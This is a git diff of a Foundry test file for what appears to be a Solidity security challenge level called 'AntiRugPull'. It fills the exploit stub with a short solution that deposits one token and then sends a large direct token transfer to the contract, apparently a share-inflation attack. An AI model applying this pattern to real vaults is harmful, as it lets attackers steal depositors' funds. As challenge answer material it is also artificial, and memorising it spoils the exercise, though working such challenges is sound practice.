@@ -4,6 +4,8 @@ pragma solidity ^0.8.25;
 import "./BaseTest.t.sol";
 import "../src/09_AntiRugPull/AntiRugPull.sol";
 import "../src/09_AntiRugPull/MintableERC20.sol";
+import {console} from "forge-std/console.sol";
+
 
 // forge test --match-contract AntiRugPullTest
 contract AntiRugPullTest is BaseTest {
@@ -21,7 +23,12 @@ contract AntiRugPullTest is BaseTest {
 
     function testExploitLevel() public {
         /* YOUR EXPLOIT GOES HERE */
+        console.log(token.balanceOf(address(instance)));
+        vm.startPrank(user1);
+        token.approve(address(instance), 1);
+        instance.deposit(1);
 
+        token.transfer(address(instance), 1 ether);
         checkSuccess();
     }
 
